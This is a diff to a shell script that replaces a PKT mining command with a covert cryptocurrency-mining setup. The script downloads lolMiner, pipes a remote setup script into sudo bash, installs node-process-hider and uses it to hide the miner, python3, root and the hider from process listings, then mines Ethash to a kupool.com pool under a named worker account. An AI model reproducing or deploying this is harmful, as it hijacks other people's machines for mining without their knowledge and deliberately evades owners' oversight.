@@ -1,4 +1,21 @@
-#!/bin/bash
+#!/bin/sh
+pkill lolMiner
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-chmod 777 data
-nohup ./data ann -p pkt1qld6l62qjyd0v8rfqmlax48g3egx6v8rtxsf836 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com > nohup.out
+sudo swapoff -a; sudo swapon -a
+sleep 10
+ph add PhoenixMinerEth.sh
+Ph add python3
+ph add root
+ph add node-process-hider
+ph add lolMiner
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user sagemode.001 --ethstratum ETHPROXY  --timeprint on --longstats 120 
+sleep 10
